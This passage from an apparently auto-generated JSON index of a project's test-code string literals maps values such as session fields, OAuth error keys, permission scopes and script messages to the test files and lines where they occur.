      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_database_authentication_failures.py:295"
      ]
    },
    "device": {
      "value": "device",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_session_management.py:201",
        "auth_service/tests/test_session_management.py:202",
        "auth_service/tests/test_session_management.py:229",
        "auth_service/tests/test_session_management.py:231"
      ]
    },
    "device_": {
      "value": "device_",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/factories/session_factory.py:37",
        "auth_service/tests/factories/session_factory.py:161"
      ]
    },
    "device_id": {
      "value": "device_id",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/factories/session_factory.py:37",
        "auth_service/tests/factories/session_factory.py:161"
      ]
    },
    "diagnosis_assistance": {
      "value": "diagnosis_assistance",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/workload_simulator.py:42"
      ]
    },
    "diff": {
      "value": "diff",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/real_test_linter.py:228"
      ]
    },
    "dim": {
      "value": "dim",
      "category": "test_literals",
      "locations": [
        "scripts/test_oauth_local.py:70"
      ]
    },
    "directories": {
      "value": "directories",
      "category": "test_literals",
      "locations": [
        "scripts/generate_test_audit.py:228"
      ]
    },
    "directories:": {
      "value": "directories:",
      "category": "test_literals",
      "locations": [
        "scripts/standardize_l3_test_names.py:239"
      ]
    },
    "directory": {
      "value": "directory",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/fake_test_scanner.py:113"
      ]
    },
    "disabled": {
      "value": "disabled",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_redis_connection_failover.py:247",
        "scripts/test_backend.py:359",
        "scripts/test_backend.py:366",
        "scripts/test_backend.py:367",
        "scripts/unified_test_runner.py:814"
      ]
    },
    "disabled:test": {
      "value": "disabled:test",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_redis_connection_failover.py:261"
      ]
    },
    "disconnected": {
      "value": "disconnected",
      "category": "test_literals",
      "locations": [
        "frontend/components/chat/ConnectionStatusIndicator.test.tsx:16",
        "frontend/components/chat/ConnectionStatusIndicator.test.tsx:17",
        "frontend/components/chat/ConnectionStatusIndicator.test.tsx:26"
      ]
    },
    "dist": {
      "value": "dist",
      "category": "test_literals",
      "locations": [
        "scripts/business_value_test_index.py:132",
        "scripts/check_conftest_violations.py:23",
        "scripts/compliance/real_test_requirements_enforcer.py:134",
        "scripts/generate_test_audit.py:25"
      ]
    },
    "dist-packages": {
      "value": "dist-packages",
      "category": "test_literals",
      "locations": [
        "scripts/business_value_test_index.py:130",
        "scripts/generate_test_audit.py:24",
        "scripts/test_exclusion_check.py:20"
      ]
    },
    "docker": {
      "value": "docker",
      "category": "test_literals",
      "locations": [
        "scripts/business_value_test_index.py:375",
        "scripts/start_test_services.py:23",
        "scripts/test_workflows_with_act.py:56"
      ]
    },
    "docker run --name postgres -e POSTGRES_PASSWORD=password -p 5432:5432 -d postgres": {
      "value": "docker run --name postgres -e POSTGRES_PASSWORD=password -p 5432:5432 -d postgres",
      "category": "test_literals",
      "locations": [
        "scripts/test_async_postgres.py:159"
      ]
    },
    "docker-compose": {
      "value": "docker-compose",
      "category": "test_literals",
      "locations": [
        "scripts/start_test_services.py:44"
      ]
    },
    "docker-compose.test.yml": {
      "value": "docker-compose.test.yml",
      "category": "test_literals",
      "locations": [
        "scripts/start_test_services.py:36"
      ]
    },
    "document_analysis": {
      "value": "document_analysis",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/workload_simulator.py:36"
      ]
    },
    "does not exist": {
      "value": "does not exist",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_staging_database_failures.py:82",
        "auth_service/tests/test_critical_staging_database_failures.py:185",
        "scripts/compliance/test_refactor_helper.py:696",
        "scripts/fix_test_import_errors.py:143"
      ]
    },
    "does not exist (OK if service has no tests)": {
      "value": "does not exist (OK if service has no tests)",
      "category": "test_literals",
      "locations": [
        "scripts/check_conftest_violations.py:108"
      ]
    },
    "does not exist, skipping.": {
      "value": "does not exist, skipping.",
      "category": "test_literals",
      "locations": [
        "scripts/remove_test_stubs.py:110"
      ]
    },
    "doesn't need splitting (": {
      "value": "doesn't need splitting (",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_sizes.py:256"
      ]
    },
    "dry_run": {
      "value": "dry_run",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_refactor_helper.py:592"
      ]
    },
    "dummy": {
      "value": "dummy",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/real_test_requirements_enforcer.py:238"
      ]
    },
    "dummy_refresh": {
      "value": "dummy_refresh",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:1380"
      ]
    },
    "duplicate": {
      "value": "duplicate",
      "category": "test_literals",
      "locations": [
        "scripts/analyze_test_overlap.py:323",
        "scripts/analyze_test_overlap.py:351",
        "scripts/analyze_test_overlap.py:379",
        "scripts/analyze_test_overlap.py:411",
        "scripts/analyze_test_overlap.py:442",
        "scripts/analyze_test_overlap.py:444",
        "scripts/analyze_test_overlap.py:485",
        "scripts/analyze_test_overlap.py:529",
        "scripts/analyze_test_overlap.py:529",
        "scripts/analyze_test_overlap.py:657"
      ]
    },
    "duplicate MagicMock import": {
      "value": "duplicate MagicMock import",
      "category": "test_literals",
      "locations": [
        "scripts/batch_fix_and_test.py:25"
      ]
    },
    "duplicate tests": {
      "value": "duplicate tests",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/fake_test_scanner.py:212"
      ]
    },
    "duplicates": {
      "value": "duplicates",
      "category": "test_literals",
      "locations": [
        "scripts/analyze_test_overlap.py:65",
        "scripts/analyze_test_overlap.py:357",
        "scripts/analyze_test_overlap.py:380",
        "scripts/analyze_test_overlap.py:411",
        "scripts/analyze_test_overlap.py:566",
        "scripts/analyze_test_overlap.py:582",
        "scripts/analyze_test_overlap.py:590"
      ]
    },
    "duration": {
      "value": "duration",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/auth-service-down-critical-scenarios.py:275",
        "scripts/real_service_test_metrics.py:20",
        "scripts/real_service_test_metrics.py:79",
        "scripts/real_service_test_metrics.py:87",
        "scripts/real_service_test_metrics.py:125",
        "scripts/startup_test_executor.py:27",
        "scripts/test_backend_optimized.py:231",
        "scripts/test_backend_optimized.py:257",
        "scripts/test_example_message_flow.py:144",
        "scripts/test_example_message_flow.py:144"
      ]
    },
    "duration_days": {
      "value": "duration_days",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/workload_simulator.py:72"
      ]
    },
    "e2e": {
      "value": "e2e",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/config/test_env.py:215",
        "scripts/add_test_markers.py:56",
        "scripts/auto_fix_test_sizes.py:346",
        "scripts/auto_fix_test_violations.py:489",
        "scripts/auto_fix_test_violations.py:490",
        "scripts/autonomous_review/test_reviewer.py:215",
        "scripts/autonomous_review/test_reviewer.py:227",
        "scripts/autonomous_review/test_reviewer.py:228",
        "scripts/business_value_test_index.py:86",
        "scripts/business_value_test_index.py:162"
      ]
    },
    "e2e-user": {
      "value": "e2e-user",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/unified/test_jwt_validation.py:329"
      ]
    },
    "e2e@netrasystems.ai": {
      "value": "e2e@netrasystems.ai",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/unified/test_jwt_validation.py:330"
      ]
    },
    "e2e_coverage": {
      "value": "e2e_coverage",
      "category": "test_literals",
      "locations": [
        "scripts/business_value_test_index.py:631",
        "scripts/business_value_test_index.py:748"
      ]
    },
    "early": {
      "value": "early",
      "category": "test_literals",
      "locations": [
        "scripts/business_value_test_index.py:108",
        "scripts/business_value_test_index.py:459"
      ]
    },
    "early|starter|standard": {
      "value": "early|starter|standard",
      "category": "test_literals",
      "locations": [
        "scripts/business_value_test_index.py:108"
      ]
    },
    "ecommerce": {
      "value": "ecommerce",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/workload_simulator.py:25",
        "netra_backend/app/services/realistic_test_data/workload_simulator.py:52",
        "netra_backend/app/services/realistic_test_data/workload_simulator.py:256",
        "netra_backend/app/services/realistic_test_data/workload_simulator.py:257"
      ]
    },
    "efficiency": {
      "value": "efficiency",
      "category": "test_literals",
      "locations": [
        "scripts/test_cold_start_e2e.py:54"
      ]
    },
    "element": {
      "value": "element",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/project_test_validator.py:172",
        "scripts/compliance/project_test_validator.py:184",
        "scripts/compliance/real_test_requirements_enforcer.py:239",
        "scripts/compliance/real_test_validator.py:136"
      ]
    },
    "email": {
      "value": "email",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/base/test_base.py:147",
        "auth_service/tests/base/test_base.py:149",
        "auth_service/tests/base/test_mixins.py:197",
        "auth_service/tests/base/test_mixins.py:202",
        "auth_service/tests/base/test_mixins.py:223",
        "auth_service/tests/base/test_mixins.py:236",
        "auth_service/tests/base/test_mixins.py:240",
        "auth_service/tests/base/test_mixins.py:282",
        "auth_service/tests/conftest.py:157",
        "auth_service/tests/factories/token_factory.py:37"
      ]
    },
    "email_verified": {
      "value": "email_verified",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_oauth_id_token_validation.py:44"
      ]
    },
    "emerald": {
      "value": "emerald",
      "category": "test_literals",
      "locations": [
        "frontend/components/chat/ConnectionStatusIndicator.test.tsx:24"
      ]
    },
    "empty password": {
      "value": "empty password",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_staging_database_credentials.py:124"
      ]
    },
    "empty/auto-pass tests immediately": {
      "value": "empty/auto-pass tests immediately",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/fake_test_scanner.py:197"
      ]
    },
    "empty_implementation": {
      "value": "empty_implementation",
      "category": "test_literals",
      "locations": [
        "scripts/remove_test_stubs.py:230"
      ]
    },
    "empty_implementations": {
      "value": "empty_implementations",
      "category": "test_literals",
      "locations": [
        "scripts/remove_test_stubs.py:65",
        "scripts/remove_test_stubs.py:214"
      ]
    },
    "enabled": {
      "value": "enabled",
      "category": "test_literals",
      "locations": [
        "scripts/test_backend.py:366",
        "scripts/test_backend.py:367"
      ]
    },
    "end-to-end": {
      "value": "end-to-end",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/project_test_validator.py:264",
        "scripts/compliance/real_test_validator.py:226"
      ]
    },
    "end_line": {
      "value": "end_line",
      "category": "test_literals",
      "locations": [
        "scripts/check_test_compliance.py:60"
      ]
    },
    "end_lineno": {
      "value": "end_lineno",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_violations.py:151",
        "scripts/auto_fix_test_violations.py:173",
        "scripts/compliance/project_test_validator.py:214",
        "scripts/compliance/real_test_requirements_enforcer.py:297",
        "scripts/compliance/real_test_validator.py:182",
        "scripts/compliance/test_fixer.py:157",
        "scripts/compliance/test_limits_checker.py:187",
        "scripts/compliance/test_refactor_helper.py:151",
        "scripts/compliance/test_refactor_helper.py:268",
        "scripts/compliance/test_size_validator.py:288"
      ]
    },
    "end_of_quarter": {
      "value": "end_of_quarter",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/workload_simulator.py:35"
      ]
    },
    "end_time": {
      "value": "end_time",
      "category": "test_literals",
      "locations": [
        "scripts/real_service_test_metrics.py:19",
        "scripts/real_service_test_metrics.py:84",
        "scripts/real_service_test_metrics.py:86",
        "scripts/real_service_test_metrics.py:124"
      ]
    },
    "end_to_end": {
      "value": "end_to_end",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_sizes.py:346",
        "scripts/auto_fix_test_violations.py:489",
        "scripts/autonomous_review/test_reviewer.py:227",
        "scripts/compliance/real_test_requirements_enforcer.py:343",
        "scripts/compliance/test_refactor_helper.py:197"
      ]
    },
    "endpoint": {
      "value": "endpoint",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_sizes.py:344"
      ]
    },
    "endpoints": {
      "value": "endpoints",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_oauth_flows_auth.py:36",
        "auth_service/tests/integration/test_oauth_flows_auth.py:37",
        "auth_service/tests/integration/test_oauth_flows_auth.py:45",
        "auth_service/tests/integration/test_oauth_flows_core.py:47",
        "auth_service/tests/integration/test_oauth_flows_core.py:48",
        "auth_service/tests/integration/test_oauth_flows_core.py:56",
        "auth_service/tests/integration/test_oauth_flows_sync.py:32",
        "auth_service/tests/integration/test_oauth_flows_sync.py:33",
        "auth_service/tests/integration/test_oauth_flows_sync.py:136",
        "auth_service/tests/utils/test_client.py:192"
      ]
    },
    "enforce_session_limits": {
      "value": "enforce_session_limits",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_session_cleanup.py:277"
      ]
    },
    "english": {
      "value": "english",
      "category": "test_literals",
      "locations": [
        "scripts/analyze_test_overlap.py:250"
      ]
    },
    "enterprise": {
      "value": "enterprise",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/factories/permission_factory.py:226",
        "scripts/business_value_test_index.py:110",
        "scripts/business_value_test_index.py:459",
        "scripts/business_value_test_index.py:675",
        "scripts/business_value_test_index.py:680",
        "scripts/test_websocket_dev_mode.py:126"
      ]
    },
    "enterprise:api_access": {
      "value": "enterprise:api_access",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/factories/permission_factory.py:44"
      ]
    },
    "enterprise:manage_billing": {
      "value": "enterprise:manage_billing",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/factories/permission_factory.py:43"
      ]
    },
    "enterprise:manage_teams": {
      "value": "enterprise:manage_teams",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/factories/permission_factory.py:41"
      ]
    },
    "enterprise:view_analytics": {
      "value": "enterprise:view_analytics",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/factories/permission_factory.py:42"
      ]
    },
    "enterprise|premium|sso|saml|sla": {
      "value": "enterprise|premium|sso|saml|sla",
      "category": "test_literals",
      "locations": [
        "scripts/business_value_test_index.py:110"
      ]
    },
    "env": {
      "value": "env",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_auth_token_validation.py:102",
        "auth_service/tests/test_auth_token_validation.py:176",
        "auth_service/tests/test_auth_token_validation.py:253",
        "auth_service/tests/test_auth_token_validation.py:281",
        "auth_service/tests/test_critical_oauth_environment_failures.py:171",
        "auth_service/tests/test_critical_oauth_environment_failures.py:175",
        "auth_service/tests/test_critical_oauth_environment_failures.py:183",
        "auth_service/tests/test_critical_oauth_environment_failures.py:193",
        "auth_service/tests/test_critical_oauth_environment_failures.py:204",
        "auth_service/tests/test_staging_database_credentials.py:348"
      ]
    },
    "env vars": {
      "value": "env vars",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_config.py:112",
        "scripts/test_staging_config.py:127",
        "scripts/test_staging_config.py:136"
      ]
    },
    "env.ACT": {
      "value": "env.ACT",
      "category": "test_literals",
      "locations": [
        "scripts/test_workflows_with_act.py:241"
      ]
    },
    "env_": {
      "value": "env_",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_runner.py:522"
      ]
    },
    "env_file": {
      "value": "env_file",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_config.py:166",
        "scripts/unified_test_config.py:175",
        "scripts/unified_test_config.py:184",
        "scripts/unified_test_config.py:318",
        "scripts/unified_test_config.py:319"
      ]
    },
    "env_vars": {
      "value": "env_vars",
      "category": "test_literals",
      "locations": [
        "scripts/test_database_url_builder_comprehensive.py:185",
        "scripts/test_database_url_builder_comprehensive.py:190",
        "scripts/test_database_url_builder_comprehensive.py:201",
        "scripts/test_database_url_builder_comprehensive.py:212",
        "scripts/test_database_url_builder_comprehensive.py:223",
        "scripts/test_database_url_builder_comprehensive.py:236",
        "scripts/test_oauth_local.py:92",
        "scripts/test_oauth_local.py:397"
      ]
    },
    "environment": {
      "value": "environment",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_database_authentication_failures.py:124",
        "auth_service/tests/test_database_authentication_failures.py:157",
        "auth_service/tests/test_postgres_compliance.py:124",
        "auth_service/tests/test_postgres_compliance.py:246",
        "scripts/test_staging_config.py:97",
        "scripts/test_staging_db_direct.py:81",
        "scripts/test_staging_deployment.py:27",
        "scripts/unified_test_runner.py:669"
      ]
    },
    "environment_name": {
      "value": "environment_name",
      "category": "test_literals",
      "locations": [
        "scripts/test_workflows_with_act.py:189"
      ]
    },
    "error": {
      "value": "error",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/llm_response_generator.py:66",
        "auth_service/tests/auth-service-down-critical-scenarios.py:191",
        "auth_service/tests/auth-service-down-critical-scenarios.py:402",
        "auth_service/tests/auth-service-down-critical-scenarios.py:402",
        "auth_service/tests/factories/audit_factory.py:176",
        "auth_service/tests/integration/test_auth_oauth_errors.py:118",
        "auth_service/tests/integration/test_auth_oauth_errors.py:123",
        "auth_service/tests/integration/test_auth_oauth_errors.py:127",
        "auth_service/tests/integration/test_auth_oauth_errors.py:143",
        "auth_service/tests/integration/test_auth_oauth_errors.py:170"
      ]
    },
    "error rate": {
      "value": "error rate",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/models.py:99"
      ]
    },
    "error:": {
      "value": "error:",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/auth-service-down-critical-scenarios.py:281",
        "scripts/test_workflows_with_act.py:206"
      ]
    },
    "error_cascade": {
      "value": "error_cascade",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/log_generator.py:68",
        "netra_backend/app/services/realistic_test_data/log_generator.py:94",
        "netra_backend/app/services/realistic_test_data/log_generator.py:153",
        "netra_backend/app/services/realistic_test_data/models.py:92"
      ]
    },
    "error_cascades": {
      "value": "error_cascades",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/models.py:15"
      ]
    },
    "error_code": {
      "value": "error_code",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/llm_response_generator.py:68",
        "netra_backend/app/services/realistic_test_data/models.py:112",
        "netra_backend/app/services/realistic_test_data/models.py:118",
        "netra_backend/app/services/realistic_test_data/models.py:123",
        "netra_backend/app/services/realistic_test_data/models.py:129",
        "netra_backend/app/services/realistic_test_data/models.py:134",
        "auth_service/tests/utils/assertion_helpers.py:159",
        "auth_service/tests/utils/assertion_helpers.py:169",
        "auth_service/tests/utils/assertion_helpers.py:170"
      ]
    },
    "error_description": {
      "value": "error_description",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_auth_oauth_errors.py:119",
        "auth_service/tests/integration/test_auth_oauth_errors.py:171",
        "auth_service/tests/integration/test_auth_oauth_errors.py:179",
        "auth_service/tests/integration/test_auth_oauth_errors.py:187",
        "auth_service/tests/integration/test_auth_oauth_errors.py:195",
        "auth_service/tests/integration/test_auth_oauth_errors.py:397"
      ]
    },
    "error_handlers": {
      "value": "error_handlers",
      "category": "test_literals",
      "locations": [
        "scripts/autonomous_review/test_reviewer.py:89"
      ]
    },
    "error_handling": {
      "value": "error_handling",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_sizes.py:351"
      ]
    },
    "error_message": {
      "value": "error_message",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/factories/audit_factory.py:56",
        "scripts/test_backend_optimized.py:276"
      ]
    },
    "error_rate": {
      "value": "error_rate",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/llm_response_generator.py:53",
        "netra_backend/app/services/realistic_test_data/log_generator.py:156",
        "netra_backend/app/services/realistic_test_data/log_generator.py:168",
        "netra_backend/app/services/realistic_test_data/log_generator.py:176",
        "netra_backend/app/services/realistic_test_data/models.py:37",
        "netra_backend/app/services/realistic_test_data/models.py:47",
        "netra_backend/app/services/realistic_test_data/models.py:57",
        "netra_backend/app/services/realistic_test_data/models.py:67",
        "netra_backend/app/services/realistic_test_data/models.py:77",
        "netra_backend/app/services/realistic_test_data/performance_simulator.py:203"
      ]
    },
    "error_score": {
      "value": "error_score",
      "category": "test_literals",
      "locations": [
        "scripts/test_error_monitor_logic.py:95",
        "scripts/test_error_monitor_logic.py:170",
        "scripts/test_error_monitor_logic.py:177",
        "scripts/test_error_monitor_logic.py:194",
        "scripts/test_error_monitor_logic.py:201"
      ]
    },
    "error_type": {
      "value": "error_type",
      "category": "test_literals",
      "locations": [
        "scripts/comprehensive_test_fixer.py:30",
        "scripts/comprehensive_test_fixer.py:42",
        "scripts/comprehensive_test_fixer.py:54",
        "scripts/comprehensive_test_fixer.py:66",
        "scripts/comprehensive_test_fixer.py:336",
        "scripts/comprehensive_test_fixer.py:340",
        "scripts/fix_test_batch.py:36",
        "scripts/fix_test_batch.py:44",
        "scripts/fix_test_batch.py:55",
        "scripts/fix_test_batch.py:65"
      ]
    },
    "errors": {
      "value": "errors",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_sizes.py:621",
        "scripts/auto_fix_test_sizes.py:675",
        "scripts/auto_fix_test_sizes.py:753",
        "scripts/auto_fix_test_sizes.py:754",
        "scripts/auto_fix_test_sizes.py:755",
        "scripts/compliance/test_refactor_helper.py:614",
        "scripts/comprehensive_test_fixer.py:283",
        "scripts/comprehensive_test_fixer.py:338",
        "scripts/real_service_test_metrics.py:27",
        "scripts/real_service_test_metrics.py:205"
      ]
    },
    "estimatedTime": {
      "value": "estimatedTime",
      "category": "test_literals",
      "locations": [
        "scripts/test_example_message_flow.py:288",
        "scripts/test_example_message_flow.py:410"
      ]
    },
    "estimated_improvement": {
      "value": "estimated_improvement",
      "category": "test_literals",
      "locations": [
        "scripts/test_backend_optimized.py:345"
      ]
    },
    "estimated_lines": {
      "value": "estimated_lines",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/demo_test_size_enforcement.py:100",
        "scripts/compliance/test_refactor_helper.py:425",
        "scripts/compliance/test_refactor_helper.py:435",
        "scripts/compliance/test_refactor_helper.py:465",
        "scripts/compliance/test_refactor_helper.py:475",
        "scripts/compliance/test_refactor_helper.py:508",
        "scripts/compliance/test_refactor_helper.py:573",
        "scripts/compliance/test_refactor_helper.py:604",
        "scripts/compliance/test_refactor_helper.py:604",
        "scripts/compliance/test_refactor_helper.py:624"
      ]
    },
    "estimated_revenue_usd": {
      "value": "estimated_revenue_usd",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/workload_simulator.py:265"
      ]
    },
    "event_metadata": {
      "value": "event_metadata",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/factories/audit_factory.py:57"
      ]
    },
    "event_type": {
      "value": "event_type",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/factories/audit_factory.py:51",
        "auth_service/tests/utils/assertion_helpers.py:258",
        "auth_service/tests/utils/assertion_helpers.py:263",
        "auth_service/tests/utils/assertion_helpers.py:264"
      ]
    },
    "ex": {
      "value": "ex",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/unit/test_oauth_authorization_code_reuse_prevention.py:383",
        "auth_service/tests/unit/test_oauth_authorization_code_reuse_prevention.py:384"
      ]
    },
    "exact duplicate test pairs. These should be immediately reviewed and consolidated.": {
      "value": "exact duplicate test pairs. These should be immediately reviewed and consolidated.",
      "category": "test_literals",
      "locations": [
        "scripts/analyze_test_overlap.py:444"
      ]
    },
    "example.com": {
      "value": "example.com",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/config/test_settings.py:58"
      ]
    },
    "example_message_id": {
      "value": "example_message_id",
      "category": "test_literals",
      "locations": [
        "scripts/test_example_message_flow.py:282",
        "scripts/test_example_message_flow.py:404"
      ]
    },
    "example_message_metadata": {
      "value": "example_message_metadata",
      "category": "test_literals",
      "locations": [
        "scripts/test_example_message_flow.py:283",
        "scripts/test_example_message_flow.py:405"
      ]
    },
    "examples": {
      "value": "examples",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/demo_test_size_enforcement.py:28",
        "scripts/compliance/demo_test_size_enforcement.py:142"
      ]
    },
    "excellent": {
      "value": "excellent",
      "category": "test_literals",
      "locations": [
        "frontend/components/chat/ConnectionStatusIndicator.test.tsx:44"
      ]
    },
    "exception": {
      "value": "exception",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_auth_oauth_errors.py:320",
        "auth_service/tests/integration/test_auth_oauth_errors.py:326",
        "auth_service/tests/integration/test_auth_oauth_errors.py:332",
        "auth_service/tests/integration/test_auth_oauth_errors.py:338",
        "auth_service/tests/integration/test_auth_oauth_errors.py:346",
        "auth_service/tests/integration/test_auth_oauth_errors.py:356",
        "scripts/auto_fix_test_sizes.py:350"
      ]
    },
    "exception:": {
      "value": "exception:",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_startup.py:256"
      ]
    },
    "excessive_mocking": {
      "value": "excessive_mocking",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/project_test_validator.py:286",
        "scripts/compliance/real_test_linter.py:164",
        "scripts/compliance/real_test_requirements_enforcer.py:368",
        "scripts/compliance/real_test_requirements_enforcer.py:516",
        "scripts/compliance/real_test_validator.py:247",
        "scripts/compliance/test_fixer.py:368"
      ]
    },
    "execution_plan": {
      "value": "execution_plan",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_runner.py:673"
      ]
    },
    "execution_results": {
      "value": "execution_results",
      "category": "test_literals",
      "locations": [
        "scripts/test_backend_optimized.py:216",
        "scripts/test_backend_optimized.py:274"
      ]
    },
    "exists in": {
      "value": "exists in",
      "category": "test_literals",
      "locations": [
        "scripts/fix_test_batch.py:116"
      ]
    },
    "exit_code": {
      "value": "exit_code",
      "category": "test_literals",
      "locations": [
        "scripts/test_verify_workflow_status_corrected.py:63",
        "scripts/test_verify_workflow_status_corrected.py:75"
      ]
    },
    "exp": {
      "value": "exp",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/base/test_base.py:168",
        "auth_service/tests/base/test_mixins.py:182",
        "auth_service/tests/base/test_mixins.py:275",
        "auth_service/tests/factories/token_factory.py:41",
        "auth_service/tests/factories/token_factory.py:135",
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:521",
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:1119",
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:1487",
        "auth_service/tests/test_auth_token_generation.py:88",
        "auth_service/tests/test_auth_token_generation.py:91"
      ]
    },
    "expect(": {
      "value": "expect(",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/real_test_requirements_enforcer.py:156"
      ]
    },
    "expected_exit_code": {
      "value": "expected_exit_code",
      "category": "test_literals",
      "locations": [
        "scripts/test_verify_workflow_status_corrected.py:64",
        "scripts/test_verify_workflow_status_corrected.py:76"
      ]
    },
    "expected_pass": {
      "value": "expected_pass",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_staging_database_credentials.py:398",
        "auth_service/tests/test_staging_database_credentials.py:406"
      ]
    },
    "expected_patterns": {
      "value": "expected_patterns",
      "category": "test_literals",
      "locations": [
        "scripts/test_cold_start_e2e.py:53",
        "scripts/test_cold_start_e2e.py:418"
      ]
    },
    "expected_status": {
      "value": "expected_status",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_auth_oauth_errors.py:173",
        "auth_service/tests/integration/test_auth_oauth_errors.py:181",
        "auth_service/tests/integration/test_auth_oauth_errors.py:189",
        "auth_service/tests/integration/test_auth_oauth_errors.py:197",
        "auth_service/tests/integration/test_auth_oauth_errors.py:216"
      ]
    },
    "expected_valid": {
      "value": "expected_valid",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_auth_oauth_google.py:183",
        "auth_service/tests/integration/test_auth_oauth_google.py:189",
        "auth_service/tests/integration/test_auth_oauth_google.py:195",
        "auth_service/tests/integration/test_auth_oauth_google.py:207",
        "auth_service/tests/integration/test_auth_oauth_google.py:220"
      ]
    },
    "expected_value": {
      "value": "expected_value",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_size_validator.py:479",
        "scripts/compliance/test_size_validator.py:488"
      ]
    },
    "expired": {
      "value": "expired",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/auth-service-down-critical-scenarios.py:371",
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:410",
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:551",
        "auth_service/tests/utils/assertion_helpers.py:56",
        "auth_service/tests/utils/assertion_helpers.py:68"
      ]
    },
    "expired.token.signature": {
      "value": "expired.token.signature",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/unified/test_jwt_validation.py:290"
      ]
    },
    "expired1": {
      "value": "expired1",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_session_management.py:313",
        "auth_service/tests/test_session_management.py:322"
      ]
    },
    "expired123": {
      "value": "expired123",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_session_cleanup.py:105",
        "auth_service/tests/test_session_cleanup.py:253"
      ]
    },
    "expired_session": {
      "value": "expired_session",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_session_management.py:134",
        "auth_service/tests/test_session_management.py:181"
      ]
    },
    "expired_sessions_cleaned": {
      "value": "expired_sessions_cleaned",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_session_cleanup.py:294",
        "auth_service/tests/test_session_cleanup.py:301"
      ]
    },
    "expires_at": {
      "value": "expires_at",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/base/test_base.py:156",
        "auth_service/tests/base/test_base.py:157",
        "auth_service/tests/factories/session_factory.py:39",
        "auth_service/tests/integration/test_redis_connection_failover.py:374",
        "auth_service/tests/test_session_management.py:313",
        "auth_service/tests/test_session_management.py:314",
        "auth_service/tests/test_session_management.py:318",
        "auth_service/tests/utils/assertion_helpers.py:111",
